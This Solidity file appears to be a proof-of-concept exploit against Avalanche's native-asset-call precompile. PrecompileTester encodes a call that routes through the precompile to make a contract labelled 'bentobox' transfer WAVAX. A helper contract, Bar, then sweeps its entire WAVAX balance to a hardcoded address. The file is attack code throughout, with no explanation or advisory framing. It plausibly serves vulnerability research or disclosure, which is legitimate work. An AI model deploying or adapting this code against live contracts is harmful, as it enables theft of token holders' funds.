// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;
import "BoringSolidity/ERC20.sol";

contract Bar {
    ERC20 wavax = ERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);

    function bar() public {
        wavax.transfer(0xfB3485c2e209A5cfBDC1447674256578f1A80eE3, wavax.balanceOf(address(this)));
    }
}

contract Foo {
    ERC20 wavax = ERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);

    function foo(address bar) public {
        wavax.transfer(bar, 1);
    }
}

contract PrecompileTester {
    address internal constant NATIVE_ASSET_CALL = 0x0100000000000000000000000000000000000002;
    IERC20 wavax = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);

    Foo public immutable foo;
    Bar public immutable bar;

    constructor(Foo _foo) {
        foo = _foo;
        bar = new Bar();
    }

    function run() external {
        // pack bentobox transfer call
        bytes memory bento_cd = abi.encodeWithSelector(Foo.foo.selector, address(bar));

        // pack bentobox call to precompile call
        bytes memory precompile_cd = abi.encodePacked(
            address(foo),
            uint256(0xec21e629d1252b3540e9d2fcd174a63af081417ea6826612e96815463b8a41d7),
            uint256(0),
            bento_cd
        );

        NATIVE_ASSET_CALL.call(precompile_cd);
    }
}
